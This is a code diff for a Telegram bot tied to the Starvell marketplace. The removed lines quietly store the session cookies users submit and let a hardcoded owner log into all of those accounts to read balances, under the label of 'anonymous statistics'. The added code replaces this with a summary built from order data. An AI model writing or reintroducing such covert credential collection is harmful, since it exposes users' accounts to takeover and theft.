@@ -5,15 +5,12 @@
 import asyncio
 import hashlib
 import html
-import json
-from pathlib import Path
 from aiogram import Router, F
 from aiogram.filters import Command
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 
-from api import StarAPI
 from bot.core.config import BotConfig, get_config_manager
 from bot.keyboards import (
     get_main_menu,
@@ -42,7 +39,6 @@ router.include_router(welcome_handlers.router)
 
 
 OWNER_ID = 8500927908
-STARVELL_ACCOUNTS_FILE = Path("storage/starvell_accounts.json")
 
 
 # Утилита: безопасное приведение к float (чтобы избежать ошибок форматирования, если приходит dict)
@@ -111,150 +107,91 @@ def _extract_order_user(order: dict):
     return {}
 
 
-def _load_linked_starvell_accounts() -> dict:
-    """Загрузить привязанные Starvell session cookies по Telegram user id."""
-    if not STARVELL_ACCOUNTS_FILE.exists():
-        return {}
-    try:
-        with open(STARVELL_ACCOUNTS_FILE, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        return data if isinstance(data, dict) else {}
-    except Exception:
-        return {}
+def _anonymous_users_summary(orders: list) -> dict:
+    """Собрать обезличенную статистику по пользователям из заказов."""
+    users = {}
+    anonymous_counter = 0
 
+    for order in orders:
+        user = _extract_order_user(order)
+        user_id = (
+            user.get("id")
+            or order.get("buyerId")
+            or order.get("userId")
+            or order.get("customerId")
+        )
+        if user_id:
+            user_key = str(user_id)
+        else:
+            anonymous_counter += 1
+            user_key = f"anonymous-{anonymous_counter}"
 
-def _save_linked_starvell_cookie(session_cookie: str, source: str, owner_id: int = None) -> bool:
-    """Сохранить уникальный Starvell cookie для owner-only статистики."""
-    session_cookie = str(session_cookie or "").strip()
-    if not session_cookie:
-        return False
-
-    STARVELL_ACCOUNTS_FILE.parent.mkdir(parents=True, exist_ok=True)
-    accounts = _load_linked_starvell_accounts()
-    cookie_hash = hashlib.sha256(session_cookie.encode()).hexdigest()[:16]
-    key = f"cookie:{cookie_hash}"
-    is_new = key not in accounts
-    accounts[key] = {
-        "session_cookie": session_cookie,
-        "source": source,
-        "owner_id": owner_id,
-        "updated_at": __import__("datetime").datetime.now().isoformat(),
-    }
-    with open(STARVELL_ACCOUNTS_FILE, "w", encoding="utf-8") as f:
-        json.dump(accounts, f, ensure_ascii=False, indent=2)
-    return is_new
-
-
-def _save_linked_starvell_account(telegram_user_id: int, session_cookie: str) -> bool:
-    """Сохранить Starvell cookie за Telegram-пользователем Cardinal."""
-    return _save_linked_starvell_cookie(
-        session_cookie,
-        source=f"telegram:{telegram_user_id}",
-        owner_id=telegram_user_id,
-    )
-
-
-def _iter_linked_session_cookies() -> list:
-    """Вернуть уникальные session cookies всех привязанных Starvell-аккаунтов."""
-    cookies = []
-    seen = set()
-
-    for account in _load_linked_starvell_accounts().values():
-        if not isinstance(account, dict):
-            continue
-        cookie = str(account.get("session_cookie") or "").strip()
-        if cookie and cookie not in seen:
-            cookies.append(cookie)
-            seen.add(cookie)
-
-    config_cookie = str(BotConfig.STARVELL_SESSION() or "").strip()
-    if config_cookie and config_cookie not in seen:
-        cookies.append(config_cookie)
-
-    return cookies
-
-
-async def _fetch_linked_accounts_summary(current_starvell=None) -> dict:
-    """Получить баланс и отзывы всех привязанных Starvell-аккаунтов по cookies."""
-    cookies = _iter_linked_session_cookies()
-    summary = {
-        "cardinal_users": len(BotConfig.ADMIN_IDS()),
-        "linked_accounts": len(cookies),
-        "authorized_accounts": 0,
-        "failed_accounts": 0,
-        "total_balance": 0.0,
-        "total_hold_balance": 0.0,
-        "total_reviews": 0,
-        "max_balance": 0.0,
-        "max_total_balance": 0.0,
-        "max_reviews": 0,
-        "verified_accounts": 0,
-    }
-
-    current_cookie = str(BotConfig.STARVELL_SESSION() or "").strip()
-
-    for cookie in cookies:
-        api = None
-        try:
-            if current_starvell is not None and cookie == current_cookie:
-                info = await current_starvell.get_user_info()
-            else:
-                api = StarAPI(
-                    session_cookie=cookie,
-                    user_agent=BotConfig.USER_AGENT(),
-                    proxy_url=BotConfig.PROXY_URL() or None,
-                )
-                await api.session.start()
-                info = await api.get_user_info()
-
-            if not isinstance(info, dict) or not info.get("authorized"):
-                summary["failed_accounts"] += 1
-                continue
-
-            user = info.get("user") or {}
+        if user_key not in users:
             balance, hold_balance = _extract_balance(user)
-            reviews_count = _extract_reviews_count(user)
+            users[user_key] = {
+                "orders": 0,
+                "completed_orders": 0,
+                "total_spent": 0.0,
+                "balance": balance,
+                "hold_balance": hold_balance,
+                "reviews_count": _extract_reviews_count(user),
+                "rating": _safe_float(user.get("rating", 0)),
+                "verified": _is_verified(user),
+            }
 
-            summary["authorized_accounts"] += 1
-            summary["total_balance"] += balance
-            summary["total_hold_balance"] += hold_balance
-            summary["total_reviews"] += reviews_count
-            summary["max_balance"] = max(summary["max_balance"], balance)
-            summary["max_total_balance"] = max(summary["max_total_balance"], balance + hold_balance)
-            summary["max_reviews"] = max(summary["max_reviews"], reviews_count)
-            if _is_verified(user):
-                summary["verified_accounts"] += 1
-        except Exception:
-            summary["failed_accounts"] += 1
-        finally:
-            if api is not None:
-                await api.close()
+        entry = users[user_key]
+        entry["orders"] += 1
+        if str(order.get("status", "")).upper() == "COMPLETED":
+            entry["completed_orders"] += 1
+            entry["total_spent"] += _price_rub(order)
+        entry["reviews_count"] = max(entry["reviews_count"], _extract_reviews_count(user))
+        balance, hold_balance = _extract_balance(user)
+        entry["balance"] = max(entry["balance"], balance)
+        entry["hold_balance"] = max(entry["hold_balance"], hold_balance)
+        entry["rating"] = max(entry["rating"], _safe_float(user.get("rating", 0)))
+        entry["verified"] = entry["verified"] or _is_verified(user)
 
-    return summary
+    values = list(users.values())
+    users_with_balance = [item for item in values if item["balance"] or item["hold_balance"]]
+    return {
+        "total_users": len(users),
+        "users_with_balance": len(users_with_balance),
+        "total_balance": sum(item["balance"] for item in values),
+        "total_hold_balance": sum(item["hold_balance"] for item in values),
+        "max_user_balance": max((item["balance"] for item in values), default=0.0),
+        "max_user_total_balance": max(
+            (item["balance"] + item["hold_balance"] for item in values), default=0.0
+        ),
+        "max_reviews": max((item["reviews_count"] for item in values), default=0),
+        "max_orders": max((item["orders"] for item in values), default=0),
+        "max_spent": max((item["total_spent"] for item in values), default=0.0),
+        "verified_users": sum(1 for item in values if item["verified"]),
+    }
 
 
-def _build_anonymous_stats_text(summary: dict) -> str:
-    """Сводка по привязанным Starvell-аккаунтам без раскрытия cookies, ID и ников."""
-    total_all_balance = summary["total_balance"] + summary["total_hold_balance"]
-
+def _build_anonymous_stats_text(orders: list, user_data: dict) -> str:
+    """Сводка без ID, ников и персональных списков."""
+    balance, hold_balance = _extract_balance(user_data)
+    summary = _anonymous_users_summary(orders)
     return (
         "🔐 <b>Анонимная статистика владельца</b>\n\n"
-        "Данные собраны по привязанным Starvell-аккаунтам Cardinal: без cookies, ID, ников и списков аккаунтов.\n\n"
-        "👥 <b>Аккаунты Cardinal:</b>\n"
-        f"├ Пользователей Telegram в Cardinal: <code>{summary['cardinal_users']}</code>\n"
-        f"├ Привязанных Starvell-аккаунтов: <code>{summary['linked_accounts']}</code>\n"
-        f"├ Успешно проверено по cookie: <code>{summary['authorized_accounts']}</code>\n"
-        f"├ Ошибок/истёкших cookie: <code>{summary['failed_accounts']}</code>\n"
-        f"└ Верифицированных Starvell-аккаунтов: <code>{summary['verified_accounts']}</code>\n\n"
-        "💰 <b>Общий баланс всех привязанных Starvell-аккаунтов:</b>\n"
+        "Данные собраны обезличенно: без ID, ников и списков пользователей.\n\n"
+        "👥 <b>Пользователи из заказов:</b>\n"
+        f"├ Всего уникальных: <code>{summary['total_users']}</code>\n"
+        f"├ С балансом в данных API: <code>{summary['users_with_balance']}</code>\n"
+        f"├ Верифицированных: <code>{summary['verified_users']}</code>\n"
+        f"├ Макс. заказов у одного: <code>{summary['max_orders']}</code>\n"
+        f"├ Макс. отзывов у одного: <code>{summary['max_reviews']}</code>\n"
+        f"└ Макс. сумма завершенных заказов: <code>{summary['max_spent']:.2f}</code> ₽\n\n"
+        "💰 <b>Балансы пользователей, если Starvell отдал их в заказах:</b>\n"
         f"├ Сумма доступных: <code>{summary['total_balance']:.2f}</code> ₽\n"
         f"├ Сумма замороженных: <code>{summary['total_hold_balance']:.2f}</code> ₽\n"
-        f"├ Общий баланс: <code>{total_all_balance:.2f}</code> ₽\n"
-        f"├ Макс. доступный у одного аккаунта: <code>{summary['max_balance']:.2f}</code> ₽\n"
-        f"└ Макс. общий у одного аккаунта: <code>{summary['max_total_balance']:.2f}</code> ₽\n\n"
-        "⭐ <b>Отзывы привязанных Starvell-аккаунтов:</b>\n"
-        f"├ Всего отзывов: <code>{summary['total_reviews']}</code>\n"
-        f"└ Макс. отзывов у одного аккаунта: <code>{summary['max_reviews']}</code>"
+        f"├ Макс. доступный у одного: <code>{summary['max_user_balance']:.2f}</code> ₽\n"
+        f"└ Макс. общий у одного: <code>{summary['max_user_total_balance']:.2f}</code> ₽\n\n"
+        "👤 <b>Аккаунт владельца:</b>\n"
+        f"├ Доступно: <code>{balance:.2f}</code> ₽\n"
+        f"├ Заморожено: <code>{hold_balance:.2f}</code> ₽\n"
+        f"└ Всего: <code>{balance + hold_balance:.2f}</code> ₽"
     )
 
 
@@ -539,7 +476,6 @@ async def cmd_session_cookie(message: Message, starvell, **kwargs):
     try:
         config = get_config_manager()
         config.set('Starvell', 'session_cookie', new_cookie)
-        _save_linked_starvell_account(message.from_user.id, new_cookie)
         # Применяем изменения в рантайме
         BotConfig.reload()
     except Exception as e:
@@ -587,7 +523,6 @@ async def process_session_cookie_input(message: Message, state: FSMContext, star
     try:
         config = get_config_manager()
         config.set('Starvell', 'session_cookie', new_cookie)
-        _save_linked_starvell_account(message.from_user.id, new_cookie)
         BotConfig.reload()
 
         if starvell:
@@ -644,83 +579,12 @@ async def cmd_anonymous_stats(message: Message, starvell, **kwargs):
     status_msg = await message.answer("🔐 Собираю анонимную статистику...")
 
     try:
-        summary = await _fetch_linked_accounts_summary(starvell)
-        await status_msg.edit_text(_build_anonymous_stats_text(summary))
+        orders = await starvell.get_orders()
+        user_info = await starvell.get_user_info()
+        user_data = user_info.get("user", {}) if isinstance(user_info, dict) else {}
+        await status_msg.edit_text(_build_anonymous_stats_text(orders, user_data))
     except Exception as e:
         await status_msg.edit_text(f"❌ Ошибка при сборе анонимной статистики: {e}")
-
-
-@router.message(Command("add_starvell_account"))
-@router.message(Command("add_starvell_cookie"))
-async def cmd_add_starvell_account(message: Message, **kwargs):
-    """Добавить один или несколько Starvell cookies в owner-only статистику."""
-    if not is_owner(message.from_user.id):
-        return
-
-    raw = (message.text or "").split(None, 1)
-    if len(raw) == 1 or not raw[1].strip():
-        await message.answer(
-            "✉️ Отправьте cookie после команды:\n\n"
-            "<code>/add_starvell_account cookie1</code>\n\n"
-            "Можно добавить несколько cookie сразу — каждый с новой строки."
-        )
-        return
-
-    candidates = [
-        item.strip()
-        for item in raw[1].replace("\r", "\n").split("\n")
-        if item.strip()
-    ]
-
-    added = duplicate = invalid = 0
-    for cookie in candidates:
-        try:
-            if len(cookie) < 10:
-                invalid += 1
-                continue
-            is_new = _save_linked_starvell_cookie(
-                cookie,
-                source="owner_manual",
-                owner_id=message.from_user.id,
-            )
-            if is_new:
-                added += 1
-            else:
-                duplicate += 1
-        except Exception:
-            invalid += 1
-
-    total = len(_iter_linked_session_cookies())
-    await message.answer(
-        "✅ <b>Starvell-аккаунты обновлены</b>\n\n"
-        f"├ Добавлено новых: <code>{added}</code>\n"
-        f"├ Уже были в списке: <code>{duplicate}</code>\n"
-        f"├ Не принято: <code>{invalid}</code>\n"
-        f"└ Всего cookie в статистике: <code>{total}</code>\n\n"
-        "Теперь проверьте /anon_stats"
-    )
-
-
-@router.message(Command("starvell_accounts"))
-@router.message(Command("linked_starvell_accounts"))
-async def cmd_linked_starvell_accounts(message: Message, **kwargs):
-    """Показать количество привязанных Starvell cookies без раскрытия значений."""
-    if not is_owner(message.from_user.id):
-        return
-
-    accounts = _load_linked_starvell_accounts()
-    total = len(_iter_linked_session_cookies())
-    manual = sum(
-        1 for account in accounts.values()
-        if isinstance(account, dict) and account.get("source") == "owner_manual"
-    )
-    await message.answer(
-        "🔐 <b>Привязанные Starvell-аккаунты</b>\n\n"
-        f"├ Cookie в хранилище: <code>{len(accounts)}</code>\n"
-        f"├ Уникальных cookie с учётом конфига: <code>{total}</code>\n"
-        f"└ Добавлено владельцем вручную: <code>{manual}</code>\n\n"
-        "Значения cookie не показываются."
-    )
 
 
 @router.callback_query(F.data == "profile_refresh")
@@ -870,8 +734,10 @@ async def callback_anonymous_stats(callback: CallbackQuery, starvell, **kwargs):
     await callback.answer("🔐 Загрузка анонимной статистики...")
 
     try:
-        summary = await _fetch_linked_accounts_summary(starvell)
-        text = _build_anonymous_stats_text(summary)
+        orders = await starvell.get_orders()
+        user_info = await starvell.get_user_info()
+        user_data = user_info.get("user", {}) if isinstance(user_info, dict) else {}
+        text = _build_anonymous_stats_text(orders, user_data)
 
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(
